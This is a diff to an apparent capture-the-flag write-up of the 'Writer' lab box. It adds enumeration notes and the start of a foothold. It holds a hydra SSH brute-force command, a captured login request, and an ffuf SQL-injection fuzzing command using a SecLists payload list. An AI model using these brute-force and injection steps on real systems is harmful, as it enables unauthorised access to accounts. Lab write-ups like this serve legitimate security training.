@@ -1,11 +1,12 @@
 # Writer 10.10.11.101
 
 Core Concepts:
-    SMB Enumeration
-    SSH brute forcing
-    pspy64
-    Python code for sending mail
-    Privilege escalation
+
+- SMB Enumeration  
+- SSH brute forcing  
+- pspy64  
+- Python code for sending mail  
+- Privilege escalation  
 
 ## Enumeration
 
@@ -93,3 +94,46 @@ We got my boy Kyle Travis!
 At this point I think we've garnered all we can from basic enumeration.  We've identified a potential attack vector at `/adminstrative` and some user credentials we might be able to use for an SSH brute force attack.  It's time to move on to...
 
 ## Foothold
+
+Let's start with ssh bruteforcing our boy kyle.  First things first, download rockyou.txt from https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt. Then sick hydra on kyle with the rockyou.txt wordlist.  If you don't already 
+have hydra just `sudo apt-get install hydra`.
+
+``` 
+hydra -l kyle -P rockyou.txt ssh://writer.htb -VV -f -t 60
+```
+
+After a few attempts it looks like the box is refusing ssh connections. Let's try SQL injection on the `/adminstration` subdomain
+Let's use burpsuite to start poking around. Intercepting a post request with random creds to administration we see post are sent in the form:
+
+```
+POST /administrative HTTP/1.1
+Host: 10.10.11.101
+Content-Length: 29
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.101
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.11.101/administrative
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+uname=admin&password=password
+```
+
+revealing that our user field is `uname` and password field is `password`, go ahead and save this (post.txt).  Let's see if this is vulnerable to injection.
+First lets grab a payload.
+
+```
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt
+```
+
+Now let's s use the payload with ffuf to fuzz a post
+
+```
+ffuf -X POST -request post.txt -w Generic-SQLi.txt:UNAME -w Generic-SQLi.txt:PASS -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790 > ffuf.sqli.writer.txt
+```
+
+Fuzzing reveals a littany of different sqlinjection you can use for logging in. We'll go with `*/*`
